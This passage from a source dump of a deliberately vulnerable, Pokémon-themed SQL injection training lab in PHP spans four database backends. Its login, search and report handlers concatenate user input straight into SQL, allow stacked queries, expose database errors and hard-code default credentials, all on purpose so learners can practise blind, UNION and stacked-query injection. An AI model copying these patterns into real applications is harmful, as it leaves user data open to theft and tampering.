    color: var(--status-hp);
    animation: blink 1s infinite;
    filter: drop-shadow(0 0 4px var(--status-hp));
}

.hint {
    background-color: var(--gba-mint);
    background-image: 
        repeating-linear-gradient(0deg, transparent, transparent 15px, rgba(0, 217, 255, 0.05) 15px, rgba(0, 217, 255, 0.05) 16px);
    padding: 16px;
    border: 2px solid var(--pkmn-blue);
    margin: 15px 0;
    box-shadow: 
        inset 0 0 0 1px rgba(0, 217, 255, 0.2),
        0 0 15px rgba(0, 217, 255, 0.2),
        2px 2px 0 var(--shadow-dark);
    position: relative;
}

.hint::before {
    content: 'üìñ';
    position: absolute;
    color: var(--pkmn-blue);
    font-weight: bold;
    text-shadow: 0 0 8px var(--pkmn-blue);
}
}

.hint strong {
    color: var(--pkmn-blue);
    font-weight: bold;
}
</file>

<file path="sqli-lab/web/public/uploads/.gitkeep">
.htaccess
*.log
.env
*.swp
*.swo
*~
.DS_Store
Thumbs.db
</file>

<file path="sqli-lab/web/public/.htaccess">
RewriteEngine On

# Redirect all requests to index.php except for existing files
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule ^(.*)$ /index.php [QSA,L]

# Prevent access to sensitive files
<FilesMatch "^\.">
    Order allow,deny
    Deny from all
</FilesMatch>
</file>

<file path="sqli-lab/web/public/index.php">
<?php
/**
 * Main Entry Point
 */

// Start session
session_start();

// Error reporting for debugging
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Load router
require_once __DIR__ . '/../src/router.php';

// Get request method
$method = $_SERVER['REQUEST_METHOD'];

// Get request URI
$uri = $_SERVER['REQUEST_URI'];

// Create router instance and route request
$router = new Router();
$router->route($uri, $method);
</file>

<file path="sqli-lab/web/src/controllers/auth.php">
<?php

/**
 * Authentication Controller
 * Demonstrates: Blind SQL Injection (Boolean-based and Time-based)
 */
class AuthController {
    private $db;
    private $dbType;
    
    public function __construct($db, $dbType) {
        $this->db = $db;
        $this->dbType = $dbType;
    }
    
    /**
     * Show login form
     */
    public function showLogin() {
        $dbType = $this->dbType;
        require __DIR__ . '/../../templates/login.php';
    }
    
    /**
     * Handle login - VULNERABLE to SQL Injection
     */
    public function handleLogin() {
        $username = $_POST['username'] ?? '';
        $password = $_POST['password'] ?? '';
        
        $query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
        
        $displayQuery = $query;
        
        // Execute query
        $result = $this->db->query($query);
        
        // Check for errors
        if (isset($result['error'])) {
            $error = $result['error'];
            $dbType = $this->dbType;
            require __DIR__ . '/../../templates/login.php';
            return;
        }
        
        // Check if user found
        if (is_array($result) && count($result) > 0) {
            // Login successful
            $_SESSION['user'] = $result[0];
            $_SESSION['logged_in'] = true;
            
            $success = "Login successful! Welcome, " . htmlspecialchars($result[0]['username']);
            $user = $result[0];
            $dbType = $this->dbType;
            require __DIR__ . '/../../templates/login.php';
        } else {
            // Login failed
            $error = "Invalid username or password";
            $dbType = $this->dbType;
            require __DIR__ . '/../../templates/login.php';
        }
    }
    
    /**
     * Logout
     */
    public function logout() {
        session_destroy();
        header("Location: /login?db=" . $this->dbType);
        exit;
    }
}
</file>

<file path="sqli-lab/web/src/controllers/report.php">
<?php

/**
 * Report Controller
 * Demonstrates: Stacked Queries, Out-of-Band, Second-Order SQLi, SQLi to RCE
 */
class ReportController {
    private $db;
    private $dbType;
    
    public function __construct($db, $dbType) {
        $this->db = $db;
        $this->dbType = $dbType;
    }
    
    /**
     * Show report form
     */
    public function showReport() {
        $dbType = $this->dbType;
        require __DIR__ . '/../../templates/report.php';
    }
    
    /**
     * Handle report submission - VULNERABLE to SQL Injection
     * Demonstrates stacked queries and advanced techniques
     */
    public function handleReport() {
        $title = $_POST['title'] ?? '';
        $content = $_POST['content'] ?? '';
        $userId = $_SESSION['user']['id'] ?? 1;
        
        // VULNERABLE: Stacked queries demonstration
        // Using multiQuery to allow multiple statements
        $query = "INSERT INTO reports (title, content, user_id) VALUES ('$title', '$content', $userId)";
        
        // Display the query for educational purposes
        $displayQuery = $query;
        
        // Execute with multi-query support (allows stacked queries)
        $result = $this->db->multiQuery($query);
        
        // Check for errors
        if (isset($result['error'])) {
            $error = $result['error'];
            $dbType = $this->dbType;
            require __DIR__ . '/../../templates/report.php';
            return;
        }
        
        // Success message
        $success = "Report submitted successfully!";
        
        $dbType = $this->dbType;
        require __DIR__ . '/../../templates/report.php';
    }
    
}
</file>

<file path="sqli-lab/web/src/controllers/search.php">
<?php

/**
 * Search Controller
 * Demonstrates: Error-based and UNION-based SQL Injection
 */
class SearchController {
    private $db;
    private $dbType;
    
    public function __construct($db, $dbType) {
        $this->db = $db;
        $this->dbType = $dbType;
    }
    
    /**
     * Show search form
     */
    public function showSearch() {
        $dbType = $this->dbType;
        require __DIR__ . '/../../templates/search.php';
    }
    
    /**
     * Handle search - VULNERABLE to SQL Injection
     */
    public function handleSearch() {
        $searchQuery = $_GET['q'] ?? $_POST['q'] ?? '';
        
        // VULNERABLE: Direct string concatenation in LIKE clause
        // Perfect for error-based and UNION-based SQLi
        $query = "SELECT * FROM products WHERE name LIKE '%$searchQuery%' OR description LIKE '%$searchQuery%'";
        
        // Display the query for educational purposes
        $displayQuery = $query;
        
        // Execute query
        $result = $this->db->query($query);
        
        // Check for errors (useful for error-based SQLi)
        if (isset($result['error'])) {
            $error = $result['error'];
            $dbType = $this->dbType;
            require __DIR__ . '/../../templates/result.php';
            return;
        }
        
        // Display results
        $results = $result;
        $dbType = $this->dbType;
        require __DIR__ . '/../../templates/result.php';
    }
}
</file>

<file path="sqli-lab/web/src/db/mssql.php">
<?php

/**
 * MSSQL Database Connection
 */
class MSSQLDB {
    private $conn;
    private $host;
    private $user;
    private $password;
    private $database;
    
    public function __construct() {
        $this->host = getenv('MSSQL_HOST') ?: 'mssql';
        $this->user = getenv('MSSQL_USER') ?: 'sa';
        $this->password = getenv('MSSQL_PASSWORD') ?: 'SqliPass123!';
        $this->database = getenv('MSSQL_DB') ?: 'sqli_db';
        
        $this->connect();
    }
    
    private function connect() {
        $connectionInfo = [
            'Database' => $this->database,
            'UID' => $this->user,
            'PWD' => $this->password,
            'CharacterSet' => 'UTF-8',
            'MultipleActiveResultSets' => true
        ];
        
        $this->conn = sqlsrv_connect($this->host, $connectionInfo);
        
        if ($this->conn === false) {
            $errors = sqlsrv_errors();
            die("MSSQL Connection failed: " . print_r($errors, true));
        }
    }
    
    /**
     * Execute a single query - VULNERABLE to SQL injection
     */
    public function query($sql) {
        $stmt = sqlsrv_query($this->conn, $sql);
        
        if ($stmt === false) {
            $errors = sqlsrv_errors();
            return ['error' => print_r($errors, true)];
        }
        
        // Check if it's a SELECT query
        $metadata = sqlsrv_field_metadata($stmt);
        
        if ($metadata === false || empty($metadata)) {
            // Non-SELECT query (INSERT, UPDATE, DELETE, etc.)
            $rowsAffected = sqlsrv_rows_affected($stmt);
            sqlsrv_free_stmt($stmt);
            return ['success' => true, 'affected_rows' => $rowsAffected];
        }
        
        $data = [];
        while ($row = sqlsrv_fetch_array($stmt, SQLSRV_FETCH_ASSOC)) {
            $data[] = $row;
        }
        
        sqlsrv_free_stmt($stmt);
        return $data;
    }
    
    /**
     * Execute multiple queries - For stacked queries demonstration
     * MSSQL supports multiple statements in a single query
     */
    public function multiQuery($sql) {
        $results = [];
        
        $stmt = sqlsrv_query($this->conn, $sql);
        
        if ($stmt === false) {
            $errors = sqlsrv_errors();
            return ['error' => print_r($errors, true)];
        }
        
        do {
            $metadata = sqlsrv_field_metadata($stmt);
            
            if ($metadata === false || empty($metadata)) {
                // Non-SELECT query
                $rowsAffected = sqlsrv_rows_affected($stmt);
                $results[] = ['success' => true, 'affected_rows' => $rowsAffected];
            } else {
                // SELECT query
                $data = [];
                while ($row = sqlsrv_fetch_array($stmt, SQLSRV_FETCH_ASSOC)) {
                    $data[] = $row;
                }
                $results[] = $data;
            }
        } while (sqlsrv_next_result($stmt));
        
        sqlsrv_free_stmt($stmt);
        return $results;
    }
    
    /**
     * Get database version
     */
    public function getVersion() {
        $sql = "SELECT @@VERSION as version";
        $result = $this->query($sql);
        
        if (isset($result[0]['version'])) {
            return $result[0]['version'];
        }
        
        return 'Unknown';
    }
    
    /**
     * Get database type
     */
    public function getType() {
        return 'MSSQL';
    }
    
    /**
     * Check if connected
     */
    public function isConnected() {
        return $this->conn !== false && $this->conn !== null;
    }
    
    /**
     * Close connection
     */
    public function close() {
        if ($this->conn) {
            sqlsrv_close($this->conn);
        }
    }
    
    /**
     * Get raw connection for advanced operations
     */
    public function getConnection() {
        return $this->conn;
    }
    
}
</file>

<file path="sqli-lab/web/src/db/mysql.php">
<?php

/**
 * MySQL Database Connection
 */
class MySQLDB {
    private $conn;
    private $host;
    private $user;
    private $password;
    private $database;
    
    public function __construct() {
        $this->host = getenv('MYSQL_HOST') ?: 'mysql';
        $this->user = getenv('MYSQL_USER') ?: 'sqli_user';
        $this->password = getenv('MYSQL_PASSWORD') ?: 'sqli_pass';
        $this->database = getenv('MYSQL_DB') ?: 'sqli_db';
        
        $this->connect();
    }
    
    private function connect() {
        $this->conn = new mysqli($this->host, $this->user, $this->password, $this->database);
        
        if ($this->conn->connect_error) {
            die("MySQL Connection failed: " . $this->conn->connect_error);
        }
        
        $this->conn->set_charset("utf8mb4");
    }
    
    /**
     * Execute a single query - VULNERABLE to SQL injection
     */
    public function query($sql) {
        $result = $this->conn->query($sql);
        
        if ($result === false) {
            // Return error for error-based SQLi demonstrations
            return ['error' => $this->conn->error, 'errno' => $this->conn->errno];
        }
        
        if ($result === true) {
            return ['success' => true, 'affected_rows' => $this->conn->affected_rows];
        }
        
        $data = [];
        while ($row = $result->fetch_assoc()) {
            $data[] = $row;
        }
        
        return $data;
    }
    
    /**
     * Execute multiple queries - For stacked queries demonstration
     */
    public function multiQuery($sql) {
        $results = [];
        
        if ($this->conn->multi_query($sql)) {
            do {
                if ($result = $this->conn->store_result()) {
                    $data = [];
                    while ($row = $result->fetch_assoc()) {
                        $data[] = $row;
                    }
                    $results[] = $data;
                    $result->free();
                } else {
                    if ($this->conn->errno) {
                        $results[] = ['error' => $this->conn->error];
                    } else {
                        $results[] = ['success' => true, 'affected_rows' => $this->conn->affected_rows];
                    }
                }
            } while ($this->conn->next_result());
        } else {
            return ['error' => $this->conn->error];
        }
        
        return $results;
    }
    
    /**
     * Get database version
     */
    public function getVersion() {
        return $this->conn->server_info;
    }
    
    /**
     * Get database type
     */
    public function getType() {
        return 'MySQL';
    }
    
    /**
     * Check if connected
     */
    public function isConnected() {
        return $this->conn && $this->conn->ping();
    }
    
    /**
     * Close connection
     */
    public function close() {
        if ($this->conn) {
            $this->conn->close();
        }
    }
    
    /**
     * Get raw connection for advanced operations
     */
    public function getConnection() {
        return $this->conn;
    }

}
</file>

<file path="sqli-lab/web/src/db/pgsql.php">
<?php

/**
 * PostgreSQL Database Connection
 */
class PostgreSQLDB {
    private $conn;
    private $host;
    private $user;
    private $password;
    private $database;
    
    public function __construct() {
        $this->host = getenv('POSTGRES_HOST') ?: 'postgres';
        $this->user = getenv('POSTGRES_USER') ?: 'sqli_user';
        $this->password = getenv('POSTGRES_PASSWORD') ?: 'sqli_pass';
        $this->database = getenv('POSTGRES_DB') ?: 'sqli_db';
        
        $this->connect();
    }
    
    private function connect() {
        $connString = sprintf(
            "host=%s port=5432 dbname=%s user=%s password=%s",
            $this->host,
            $this->database,
            $this->user,
            $this->password
        );
        
        $this->conn = pg_connect($connString);
        
        if (!$this->conn) {
            die("PostgreSQL Connection failed");
        }
    }
    
    /**
     * Execute a single query - VULNERABLE to SQL injection
     */
    public function query($sql) {
        $result = pg_query($this->conn, $sql);
        
        if ($result === false) {
            return ['error' => pg_last_error($this->conn)];
        }
        
        // Check if it's a SELECT query
        $resultType = pg_result_status($result);
        
        if ($resultType === PGSQL_COMMAND_OK) {
            return ['success' => true, 'affected_rows' => pg_affected_rows($result)];
        }
        
        $data = [];
        while ($row = pg_fetch_assoc($result)) {
            $data[] = $row;
        }
        
        return $data;
    }
    
    /**
     * Execute multiple queries - For stacked queries demonstration
     * Using pg_send_query for async execution which supports multiple statements
     */
    public function multiQuery($sql) {
        $results = [];
        
        // Send query asynchronously (supports multiple statements)
        if (!pg_send_query($this->conn, $sql)) {
            return ['error' => pg_last_error($this->conn)];
        }
        
        // Get all results
        while ($result = pg_get_result($this->conn)) {
            $resultType = pg_result_status($result);
            
            if ($resultType === PGSQL_FATAL_ERROR || $resultType === PGSQL_BAD_RESPONSE) {
                $results[] = ['error' => pg_result_error($result)];
            } elseif ($resultType === PGSQL_COMMAND_OK) {
                $results[] = ['success' => true, 'affected_rows' => pg_affected_rows($result)];
            } elseif ($resultType === PGSQL_TUPLES_OK) {
                $data = [];
                while ($row = pg_fetch_assoc($result)) {
                    $data[] = $row;
                }
                $results[] = $data;
            }
        }
        
        return $results;
    }
    
    /**
     * Get database version
     */
    public function getVersion() {
        $result = pg_version($this->conn);
        return $result['server'] ?? 'Unknown';
    }
    
    /**
     * Get database type
     */
    public function getType() {
        return 'PostgreSQL';
    }
    
    /**
     * Check if connected
     */
    public function isConnected() {
        return $this->conn && pg_connection_status($this->conn) === PGSQL_CONNECTION_OK;
    }
    
    /**
     * Close connection
     */
    public function close() {
        if ($this->conn) {
            pg_close($this->conn);
        }
    }
    
    /**
     * Get raw connection for advanced operations
     */
    public function getConnection() {
        return $this->conn;
    }

}
</file>

<file path="sqli-lab/web/src/db/sqlite.php">
<?php

/**
 * SQLite Database Connection
 */
class SQLiteDB {
    private $conn;
    private $dbPath;
    
    public function __construct() {
        $this->dbPath = __DIR__ . '/../../../sqli.db';
        $this->dbPath = './sqli.db';

        $this->connect();
        $this->initializeSchema();
    }
    
    private function connect() {
        try {
            $this->conn = new SQLite3($this->dbPath);
            $this->conn->enableExceptions(true);
        } catch (Exception $e) {
            die("SQLite Connection failed: " . $e->getMessage());
        }
    }
    
    private function initializeSchema() {
        // Check if tables exist
        $result = $this->conn->query("SELECT name FROM sqlite_master WHERE type='table' AND name='users'");
        if (!$result->fetchArray()) {
            // Execute schema from seed file
            $seedFile = __DIR__ . '/../../../seeds/sqlite.sql';
            if (file_exists($seedFile)) {
                $sql = file_get_contents($seedFile);
                $this->conn->exec($sql);
            }
        }
    }
    
    /**
     * Execute a single query - VULNERABLE to SQL injection
     */
    public function query($sql) {
        try {
            $result = $this->conn->query($sql);
            
            if ($result === false) {
                return ['error' => $this->conn->lastErrorMsg(), 'errno' => $this->conn->lastErrorCode()];
            }
            
            if ($result === true) {
                return ['success' => true, 'affected_rows' => $this->conn->changes()];
            }
            
            $data = [];
            while ($row = $result->fetchArray(SQLITE3_ASSOC)) {
                $data[] = $row;
            }
            
            return $data;
        } catch (Exception $e) {
            return ['error' => $e->getMessage()];
        }
    }
    
    /**
     * Execute multiple queries - For stacked queries demonstration
     * SQLite3::exec() supports multiple statements separated by semicolons
     */
    public function multiQuery($sql) {
        try {
            $result = $this->conn->exec($sql);
            
            if ($result === false) {
                return ['error' => $this->conn->lastErrorMsg()];
            }
            
            return [['success' => true, 'affected_rows' => $this->conn->changes()]];
        } catch (Exception $e) {
            return ['error' => $e->getMessage()];
        }
    }
    
    /**
     * Get database version
     */
    public function getVersion() {
        $version = SQLite3::version();
        return $version['versionString'];
    }
    
    /**
     * Get database type
     */
    public function getType() {
        return 'SQLite';
    }
    
    /**
     * Check if connected
     */
    public function isConnected() {
        return $this->conn !== null;
    }
    
    /**
     * Close connection
     */
    public function close() {
        if ($this->conn) {
            $this->conn->close();
        }
    }
    
    /**
     * Get raw connection for advanced operations
     */
    public function getConnection() {
        return $this->conn;
    }

}
</file>

<file path="sqli-lab/web/src/database_factory.php">
<?php

/**
 * Database Factory - Centralized database creation
 */
class DatabaseFactory {
    /**
     * Create database instance based on type
     * 
     * @param string $type Database type (mysql, sqlite, pgsql, mssql)
     * @return object Database connection object
     * @throws Exception if database driver not found or connection fails
     */
    public static function create($type) {
        // Validate database type
        $allowedTypes = ['mysql', 'sqlite', 'pgsql', 'mssql'];
        if (!in_array($type, $allowedTypes)) {
            $type = 'mysql';
        }
        
        // Load database driver file
        $dbFile = __DIR__ . "/db/{$type}.php";
        if (!file_exists($dbFile)) {
            throw new Exception("Database driver not found: {$type}");
        }
        
        require_once $dbFile;
        
        // Map database type to class name
        $classMap = [
            'mysql' => 'MySQLDB',
            'sqlite' => 'SQLiteDB',
            'pgsql' => 'PostgreSQLDB',
            'mssql' => 'MSSQLDB'
        ];
        
        $className = $classMap[$type];
        $db = new $className();
        
        // Verify connection
        if (!$db->isConnected()) {
            throw new Exception("Failed to connect to {$type} database");
        }
        
        return $db;
    }
}
</file>

<file path="sqli-lab/web/src/router.php">
<?php

require_once __DIR__ . '/database_factory.php';

/**
 * Closure-based Router
 * 
 * Inspired by Laravel/Slim framework routing style.
 * Uses closures for cleaner route definitions.
 */
class Router {
    private $routes = [];
    private $db;
    private $dbType;
    
    public function __construct() {
        // Get database type from query parameter
        $this->dbType = $_GET['db'] ?? 'mysql';
        
        // Create database connection via factory
        try {
            $this->db = DatabaseFactory::create($this->dbType);
        } catch (Exception $e) {
            die("Database error: " . $e->getMessage());
        }
        
        // Register all routes
        $this->registerRoutes();
    }
    
    /**
     * Register GET route
     */
    private function get($path, $callback) {
        $this->routes['GET'][$path] = $callback;
    }
    
    /**
     * Register POST route
     */
    private function post($path, $callback) {
        $this->routes['POST'][$path] = $callback;
    }
    
    /**
     * Register route for multiple HTTP methods
     */
    private function map($methods, $path, $callback) {
        foreach ((array)$methods as $method) {
            $this->routes[$method][$path] = $callback;
        }
    }
    
    /**
     * Register all application routes
     */
    private function registerRoutes() {
        // Home page
        $this->get('/', function() {
            $dbInfo = [
                'type' => $this->db->getType(),
                'version' => $this->db->getVersion(),
                'connected' => $this->db->isConnected()
            ];
            require __DIR__ . '/../templates/home.php';
        });
        
        // Login routes
        $this->get('/login', function() {
            require_once __DIR__ . '/controllers/auth.php';
            $controller = new AuthController($this->db, $this->dbType);
            $controller->showLogin();
        });
        
        $this->post('/login', function() {
            require_once __DIR__ . '/controllers/auth.php';
            $controller = new AuthController($this->db, $this->dbType);
            $controller->handleLogin();
        });
        
        // Logout route
        $this->get('/logout', function() {
            require_once __DIR__ . '/controllers/auth.php';
            $controller = new AuthController($this->db, $this->dbType);
            $controller->logout();
        });
        
        // Search routes
        $this->get('/search', function() {
            // Show search form or handle GET search
            require_once __DIR__ . '/controllers/search.php';
            $controller = new SearchController($this->db, $this->dbType);
            
            if (isset($_GET['q'])) {
                $controller->handleSearch();
            } else {
                $controller->showSearch();
            }
        });
        
        $this->post('/search', function() {
            require_once __DIR__ . '/controllers/search.php';
            $controller = new SearchController($this->db, $this->dbType);
            $controller->handleSearch();
        });
        
        // Report routes
        $this->get('/report', function() {
            require_once __DIR__ . '/controllers/report.php';
            $controller = new ReportController($this->db, $this->dbType);
            $controller->showReport();
        });
        
        $this->post('/report', function() {
            require_once __DIR__ . '/controllers/report.php';
            $controller = new ReportController($this->db, $this->dbType);
            $controller->handleReport();
        });
    }
    
    /**
     * Route incoming request to appropriate handler
     */
    public function route($uri, $method = 'GET') {
        // Parse URI to remove query string
        $path = parse_url($uri, PHP_URL_PATH);
        
        // Clean up path
        $path = rtrim($path, '/');
        if (empty($path)) {
            $path = '/';
        }
        
        // Special handling for /index.php
        if ($path === '/index.php') {
            $path = '/';
        }
        
        // Check if route exists for this method and path
        if (isset($this->routes[$method][$path])) {
            // Execute the closure
            call_user_func($this->routes[$method][$path]);
        } else {
            // Route not found
            http_response_code(404);
            echo "404 - Page Not Found";
        }
    }
    
    /**
     * Get database type
     */
    public function getDbType() {
        return $this->dbType;
    }
    
    /**
     * Get database connection
     */
    public function getDbConnection() {
        return $this->db;
    }
}
</file>

<file path="sqli-lab/web/templates/home.php">
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SQL Injection Lab - Pok√©dex Edition</title>
    <link rel="stylesheet" href="/css/style.css">
    <link href="https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap" rel="stylesheet">
</head>
<body>
    <div class="container">
        <header>
            <h1>‚ö° SQLI POK√âDEX LAB ‚ö°</h1>
            <p class="warning">‚ö† WARNING: INTENTIONALLY VULNERABLE - EDUCATION ONLY! ‚ö†</p>
        </header>
        
        <div class="db-info">
            <h2>‚ïê‚ïê‚ïê POK√âDEX DATABASE STATUS ‚ïê‚ïê‚ïê</h2>
            <p><strong>‚ñ∫ TYPE:</strong> <?= htmlspecialchars(strtoupper($dbInfo['type'])) ?></p>
            <p><strong>‚ñ∫ VERSION:</strong> <?= htmlspecialchars($dbInfo['version']) ?></p>
            <p><strong>‚ñ∫ STATUS:</strong> <span class="<?= $dbInfo['connected'] ? 'connected' : 'disconnected' ?>">
                <?= $dbInfo['connected'] ? '‚óÜ ONLINE' : '‚úï OFFLINE' ?>
            </span></p>
        </div>
        
        <div class="db-selector">
            <h3>‚ïê‚ïê‚ïê SELECT YOUR POK√âBALL ‚ïê‚ïê‚ïê</h3>
            <div class="db-buttons">
                <a href="?db=mysql" class="btn <?= $_GET['db'] === 'mysql' || !isset($_GET['db']) ? 'active' : '' ?>">‚óâ MYSQL</a>
                <a href="?db=sqlite" class="btn <?= $_GET['db'] === 'sqlite' ? 'active' : '' ?>">‚óâ SQLITE</a>
                <a href="?db=pgsql" class="btn <?= $_GET['db'] === 'pgsql' ? 'active' : '' ?>">‚óâ PGSQL</a>
                <a href="?db=mssql" class="btn <?= $_GET['db'] === 'mssql' ? 'active' : '' ?>">‚óâ MSSQL</a>
            </div>
        </div>
        
        <div class="features">
            <h2>‚ïê‚ïê‚ïê TRAINING ZONES ‚ïê‚ïê‚ïê</h2>
            
            <div class="feature-card">
                <h3>üîê GYM 1: BLIND INJECTION</h3>
                <ul>
                    <li>Boolean-based blind SQLi</li>
                    <li>Time-based blind SQLi</li>
                    <li>Authentication bypass</li>
                </ul>
                <a href="/login?db=<?= htmlspecialchars($_GET['db'] ?? 'mysql') ?>" class="btn">‚ñ∂ ENTER GYM</a>
            </div>
            
            <div class="feature-card">
                <h3>üîç GYM 2: ERROR & UNION ATTACKS</h3>
                <ul>
                    <li>Error-based SQLi</li>
                    <li>UNION-based SQLi</li>
                    <li>Information schema enumeration</li>
                </ul>
                <a href="/search?db=<?= htmlspecialchars($_GET['db'] ?? 'mysql') ?>" class="btn">‚ñ∂ ENTER GYM</a>
            </div>
            
            <div class="feature-card">
                <h3>üìä GYM 3: ADVANCED</h3>
                <ul>
                    <li>Stacked queries</li>
                    <li>Out-of-band exfiltration</li>
                    <li>SQL injection to RCE</li>
                </ul>
                <a href="/report?db=<?= htmlspecialchars($_GET['db'] ?? 'mysql') ?>" class="btn">‚ñ∂ ENTER GYM</a>
            </div>
        </div>
        
        <footer>
            <p>‚óÜ PROFESSOR OAK'S SQL LAB ‚óÜ FROM FCI WITH LUV:3 ‚óÜ</p>
        </footer>
    </div>
</body>
</html>
</file>

<file path="sqli-lab/web/templates/login.php">
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GYM 1: Blind Injection - Pok√©dex Lab</title>
    <link rel="stylesheet" href="/css/style.css">
    <link href="https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap" rel="stylesheet">
</head>
<body>
    <div class="container">
        <header>
            <h1>üîê GYM 1: BLIND INJECTION üîê</h1>
            <p class="warning">‚ö† ACTIVE DB: <?= htmlspecialchars(strtoupper($dbType)) ?> ‚ö†</p>
            <a href="/?db=<?= htmlspecialchars($dbType) ?>" class="btn">‚óÄ RETURN HOME</a>
        </header>
        
        <?php if (isset($success)): ?>
            <div class="success-box">
                <h3>‚óÜ TRAINER CAPTURED! ‚óÜ</h3>
                <p><?= htmlspecialchars($success) ?></p>
                <?php if (isset($user)): ?>
                    <h4>‚ïê‚ïê‚ïê TRAINER DATA ‚ïê‚ïê‚ïê</h4>
                    <table>
                        <tr>
                            <th>‚óÜ FIELD</th>
                            <th>‚óÜ VALUE</th>
                        </tr>
                        <?php foreach ($user as $key => $value): ?>
                            <tr>
                                <td><strong><?= htmlspecialchars($key) ?></strong></td>
                                <td><?= htmlspecialchars($value instanceof DateTime ? $value->format('Y-m-d H:i:s') : $value) ?></td>
                            </tr>
                        <?php endforeach; ?>
                    </table>
                <?php endif; ?>
                <a href="/logout?db=<?= htmlspecialchars($dbType) ?>" class="btn">‚ñ∂ LOGOUT</a>
            </div>
        <?php endif; ?>
        
        <?php if (isset($error)): ?>
            <div class="error-box">
                <h3>‚úï ATTACK FAILED</h3>
                <p><?= htmlspecialchars($error) ?></p>
            </div>
        <?php endif; ?>
        
        <?php if (isset($displayQuery)): ?>
            <div class="query-display">
                <strong>‚ñ∫ EXECUTED QUERY:</strong><br>
                <?= htmlspecialchars($displayQuery) ?>
            </div>
        <?php endif; ?>
        
        <form method="POST" action="/login?db=<?= htmlspecialchars($dbType) ?>">
            <h2>‚ïê‚ïê‚ïê TRAINER LOGIN ‚ïê‚ïê‚ïê</h2>
            
            <div class="form-group">
                <label for="username">‚ñ∫ TRAINER ID:</label>
                <input type="text" id="username" name="username" value="<?= htmlspecialchars($_POST['username'] ?? '') ?>" required>
            </div>
            
            <div class="form-group">
                <label for="password">‚ñ∫ PASSWORD:</label>
                <input type="password" id="password" name="password" required>
            </div>
            
            <button type="submit" class="btn">‚ñ∂ LOGIN</button>
        </form>
        
        <div class="hint">
            <h3>‚ïê‚ïê‚ïê PROFESSOR'S NOTES: BLIND INJECTION ‚ïê‚ïê‚ïê</h3>
            
            <h4>‚óÜ TEST TRAINERS:</h4>
            <ul>
                <li><strong>TRAINER:</strong> admin | <strong>PASS:</strong> admin123</li>
                <li><strong>TRAINER:</strong> john_doe | <strong>PASS:</strong> password123</li>
            </ul>
        </div>
        
        <footer>
            <p>‚óÜ PROFESSOR OAK'S SQL LAB ‚óÜ FROM FCI WITH LUV:3 ‚óÜ</p>
        </footer>
    </div>
</body>
</html>
</file>

<file path="sqli-lab/web/templates/report.php">
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GYM 3: Elite Four - SQL Lab</title>
    <link rel="stylesheet" href="/css/style.css">
    <link href="https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap" rel="stylesheet">
</head>
<body>
    <div class="container">
        <header>
            <h1>üèÜ GYM 3: ELITE FOUR CHALLENGE üèÜ</h1>
            <p class="warning">‚ö† ACTIVE DB: <?= htmlspecialchars(strtoupper($dbType)) ?> | STACKED QUERIES & RCE ‚ö†</p>
            <a href="/?db=<?= htmlspecialchars($dbType) ?>" class="btn">‚óÄ RETURN HOME</a>
        </header>
        
        <?php if (isset($success)): ?>
            <div class="success-box">
                <h3>‚óÜ MISSION COMPLETE! ‚óÜ</h3>
                <p><?= htmlspecialchars($success) ?></p>
            </div>
        <?php endif; ?>
        
        <?php if (isset($error)): ?>
            <div class="error-box">
                <h3>‚úï ATTACK FAILED</h3>
                <pre><?= htmlspecialchars($error) ?></pre>
            </div>
        <?php endif; ?>
        
        <?php if (isset($displayQuery)): ?>
            <div class="query-display">
                <strong>‚ñ∫ EXECUTED QUERY:</strong><br>
                <?= htmlspecialchars($displayQuery) ?>
            </div>
        <?php endif; ?>
        
        <form method="POST" action="/report?db=<?= htmlspecialchars($dbType) ?>">
            <h2>‚ïê‚ïê‚ïê SUBMIT BATTLE REPORT ‚ïê‚ïê‚ïê</h2>
            
            <div class="form-group">
                <label for="title">‚ñ∫ REPORT TITLE:</label>
                <input type="text" id="title" name="title" value="<?= htmlspecialchars($_POST['title'] ?? '') ?>" required>
            </div>
            
            <div class="form-group">
                <label for="content">‚ñ∫ REPORT CONTENT:</label>
                <textarea id="content" name="content" required><?= htmlspecialchars($_POST['content'] ?? '') ?></textarea>
            </div>
            
            <button type="submit" class="btn">‚ñ∂ SUBMIT</button>
        </form>
        
        <div class="hint">
            <h3>‚ïê‚ïê‚ïê PROFESSOR'S NOTES: STACKED QUERIES ‚ïê‚ïê‚ïê</h3>

            
            <h3>‚ïê‚ïê‚ïê OUT-OF-BAND (OOB) EXPLOITATION ‚ïê‚ïê‚ïê</h3>
            
        <footer>
            <p>‚óÜ PROFESSOR OAK'S SQL LAB ‚óÜ FROM FCI WITH LUV:3 ‚óÜ</p>
        </footer>
    </div>
</body>
</html>
</file>

<file path="sqli-lab/web/templates/result.php">
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pok√©dex Results - SQL Lab</title>
    <link rel="stylesheet" href="/css/style.css">
    <link href="https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap" rel="stylesheet">
</head>
<body>
    <div class="container">
        <header>
            <h1>üîç POK√âDEX DATA üîç</h1>
            <p class="warning">‚ö† ACTIVE DB: <?= htmlspecialchars(strtoupper($dbType)) ?> ‚ö†</p>
            <a href="/search?db=<?= htmlspecialchars($dbType) ?>" class="btn">‚óÄ NEW SEARCH</a>
            <a href="/?db=<?= htmlspecialchars($dbType) ?>" class="btn">‚óÄ HOME</a>
        </header>
        
        <?php if (isset($error)): ?>
            <div class="error-box">
                <h3>‚úï SYSTEM ERROR (ERROR-BASED OPPORTUNITY!)</h3>
                <pre><?= htmlspecialchars($error) ?></pre>
            </div>
        <?php endif; ?>
        
        <?php if (isset($displayQuery)): ?>
            <div class="query-display">
                <strong>‚ñ∫ EXECUTED QUERY:</strong><br>
                <?= htmlspecialchars($displayQuery) ?>
            </div>
        <?php endif; ?>
        
